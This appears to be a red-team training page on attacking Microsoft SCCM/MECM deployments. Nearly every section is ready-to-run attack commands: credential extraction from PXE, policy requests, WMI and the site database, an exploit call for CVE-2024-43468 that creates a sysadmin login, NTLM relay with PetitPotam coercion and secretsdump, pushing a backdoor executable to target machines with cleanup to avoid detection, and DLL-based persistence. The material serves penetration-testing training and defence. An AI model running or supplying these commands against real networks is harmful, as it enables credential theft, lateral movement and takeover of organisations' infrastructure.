---
layout: training-page
title: "SCCM / MECM Attacks — Red Team Academy"
module: "Active Directory"
tags:
  - sccm
  - mecm
  - deployment
  - credential-theft
  - lateral-movement
  - active-directory
page_key: "ad-sccm-attacks"
render_with_liquid: false
---

# SCCM / MECM Attacks

Microsoft Configuration Manager (SCCM, now called MECM — Microsoft Endpoint Configuration Manager) is widely deployed for software distribution, patch management, and device configuration across enterprise networks. Its privileged position in the network and the credentials it stores make it a high-value target. This page covers credential extraction, privilege escalation, lateral movement, and takeover techniques.

## Architecture Overview

```
Primary Site Server  — Central SCCM control server, has MSSQL database
Distribution Point   — Serves software packages to clients (SMB share: SCCMContentLib$)
Management Point     — Clients communicate here for policy and status
SCCM Client          — Installed on managed endpoints, pulls policy from management point
NAA                  — Network Access Account: a domain account stored in SCCM used for unauthenticated content access
```

## Enumeration

### SCCMHunter

```
# Install
pip install sccmhunter

# Discover SCCM assets in the domain
sccmhunter.py find -u user -p 'Password123' -dc-ip 10.10.10.10 -d domain.lab

# Show discovered site servers
sccmhunter.py show -siteservers
```

### SharpSCCM

```
# Get managed devices from a known server and site code
.\SharpSCCM.exe get devices --server <SERVER_NAME> --site-code <SITE_CODE>

# Get all SCCM secrets (NAA, task sequence credentials)
.\SharpSCCM.exe get secrets

# Execute command on a device
.\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\cmd.exe /c whoami > C:\temp\out.txt" -s --debug
```

### MalSCCM

```
# From a compromised SCCM client — locate management server
MalSCCM.exe locate

# Enumerate over WMI as Distribution Point admin
MalSCCM.exe inspect /server:<DP_FQDN> /groups

# From management server — enumerate targets
MalSCCM.exe inspect /all
MalSCCM.exe inspect /computers
MalSCCM.exe inspect /primaryusers
MalSCCM.exe inspect /groups
MalSCCM.exe inspect /applications
MalSCCM.exe inspect /deployments
```

## Credential Theft from SCCM

### CRED-1: PXE Boot Credential Extraction

If PXE boot is enabled and the boot media is not password-protected, you can extract the Network Access Account credentials from the PXE response.

```
# Check if PXE is enabled on distribution point:
# HKLM\Software\Microsoft\SMS\DP\PxeInstalled = 1
# HKLM\Software\Microsoft\SMS\DP\IsPxe = 1

# Capture PXE response on network
sudo python3 pxethiefy.py explore -i eth0

# Alternative: PXEThief
# https://github.com/MWR-CyberSec/PXEThief
```

### CRED-2: Network Access Account (NAA) via Policy Request

The NAA is a domain account stored in SCCM policy. When PKI certificates are not required for client authentication, you can spoof a new client and request the NAA policy directly.

```
# Create a fake machine account
addcomputer.py -computer-name 'attacker$' -computer-pass 'Password123' \
  -dc-ip 10.10.10.10 domain.lab/user:'Password123'

# Request NAA credentials via SharpSCCM (easy mode)
.\SharpSCCM.exe get naa -r newdevice -u attacker$ -p Password123
.\SharpSCCM.exe get naa
.\SharpSCCM.exe get secrets -u <machine-account$> -p <password>

# Stealthy mode using sccmwtf
# 1. Add MECM server to /etc/hosts: 192.168.33.11 MECM MECM.SCCM.LAB
# 2. Request policy
python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\customsccm$' 'Password123'

# 3. Decrypt the NAA credentials
cat /tmp/naapolicy.xml | grep 'NetworkAccessUsername\|NetworkAccessPassword' -A 5 \
  | grep -e 'CDATA' | cut -d '[' -f 3 | cut -d ']' -f 1 \
  | xargs -I {} python3 policysecretunobfuscate.py {}
```

### CRED-3: Extract DPAPI Blobs from WMI

On SCCM clients, credentials are stored as DPAPI-encrypted blobs in the WMI repository. Requires local admin on the SCCM client.

```
# Find SCCM credential blobs in WMI
Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
# Output example:
# NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
# NetworkAccessUsername : <![CDATA[E600000001...00F92]]>

# Decrypt using SharpSCCM
.\SharpSCCM.exe local secrets -m wmi

# Decrypt using SharpDPAPI
$str = "060...F2DAF"
$bytes = for($i=0; $i -lt $str.Length; $i++) {
  [byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++
}
$b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
.\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt

# Remote extraction via SCCMHunter
python3 ./sccmhunter.py http -u "administrator" -p "Password123" \
  -d domain.lab -dc-ip 10.10.10.10 -auto
```

### CRED-4: Extract from CIM Repository (Disk)

```
# Search WMI repository on disk for SCCM credentials
.\SharpSCCM.exe local secrets -m disk
.\SharpDPAPI.exe search /type:file /path:C:\Windows\System32\wbem\Repository\OBJECTS.DATA

# Check ACL on repository file
Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
```

### CRED-5: Site Database — SC_UserAccount Table

```
# Requires site database access and site server's private key
# Using Mimikatz
mimikatz# misc::sccm /connectionstring:"DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;"

# Using SQLRecon
SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials

# Dump encrypted credentials from DB then decrypt
SQLRecon.exe /auth:WinToken /host:<SITE-DB> /database:CM_<SITECODE> \
  /module:query /command:"SELECT * FROM SC_UserAccount"
sccmdecryptpoc.exe 0C010000080...5D6F0
```

## CVE-2024-43468 — Unauthenticated SQL Injection

```
# SCCM ConfigMgr 2403 unauthenticated SQLi
# Exploit: create a sysadmin account, then access DB directly

python3 CVE-2024-43468.py -t cmc.corp.local \
  -sql "create login [CORP\user1] from windows ; \
        exec master.dbo.sp_addsrvrolemember [CORP\user1], 'sysadmin'"

mssqlclient.py -debug -windows-auth 'CORP/user1:xxx'@cmc-db.corp.local
SQL> select name from sysdatabases where name like 'CM_%'
```

## Lateral Movement via Application Deployment

```
# 1. Create a new device group for your targets
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device

# 2. Add target machines to the group
MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL

# 3. Create a malicious application pointing to your payload
#    (must be on a share the SCCM server can access)
MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\backdoor.exe"

# 4. Deploy the application to target group
MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment

# 5. Force clients to check in immediately
MalSCCM.exe checkin /groupname:TargetGroup

# 6. Cleanup to avoid detection
MalSCCM.exe app /cleanup /name:demoapp
MalSCCM.exe group /delete /groupname:TargetGroup
```

## SCCM Relay Attacks

### TAKEOVER1 — Low Priv to DB Admin via MSSQL Relay

```
# Requirements: DB on separate server from site server, site server is sysadmin on DB

# Generate privilege-escalation SQL query
python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab \
  -dc-ip 192.168.33.10 -tu carol -sc P01 -stacked

# Set up NTLM relay to the MSSQL server
ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 \
  -q "USE CM_P01; INSERT INTO RBAC_Admins ..."

# Coerce authentication from site server
petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11

# Connect as SCCM admin
python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11
```

### TAKEOVER2 — Low Priv to MECM Admin via SMB Relay

```
# Requirements: site server's computer account is admin on MSSQL server

# Start SOCKS relay targeting the MSSQL server
ntlmrelayx.py -t 192.168.33.12 -smb2support -socks

# Coerce auth from site server using NAA credentials retrieved from SCCM
petitpotam.py -d sccm.lab -u sccm-naa -p '123456789' 192.168.33.1 192.168.33.11

# Use SOCKS to access the MSSQL server as MECM computer account
proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12
proxychains -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12
```

## SCCM Persistence via CcmPwn

```
# CcmExec service runs on every interactive session on SCCM clients
# Requires admin on the target machine

# Backdoor SCNotification.exe.config to load your DLL
python3 ccmpwn.py domain/user:password@workstation.domain.local exec \
  -dll evil.dll -config exploit.config

# Coerce authentication to an attacker-controlled share
python3 ccmpwn.py domain/user:password@workstation.domain.local coerce \
  -computer 10.10.10.10
```

## Key Tools

```
SharpSCCM     — github.com/Mayyhem/SharpSCCM
MalSCCM       — github.com/nettitude/MalSCCM
SCCMHunter    — github.com/garrettfoster13/sccmhunter
CMLoot        — github.com/1njected/CMLoot (SMB share loot)
Misconfig-Mgr — github.com/subat0mik/Misconfiguration-Manager
SharpDPAPI    — github.com/GhostPack/SharpDPAPI
sccmwtf       — github.com/xpn/sccmwtf
CcmPwn        — github.com/mandiant/CcmPwn
```

## Resources

- InternalAllTheThings — SCCM — `swisskyrepo.github.io/InternalAllTheThings`
- Misconfiguration Manager — `github.com/subat0mik/Misconfiguration-Manager`
- Attacking and Defending Configuration Manager — Logan Goins — `logan-goins.com/2025-04-25-sccm/`
- The Phantom Credentials of SCCM — Duane Michael — `posts.specterops.io`
- CVE-2024-43468 — `github.com/synacktiv/CVE-2024-43468`
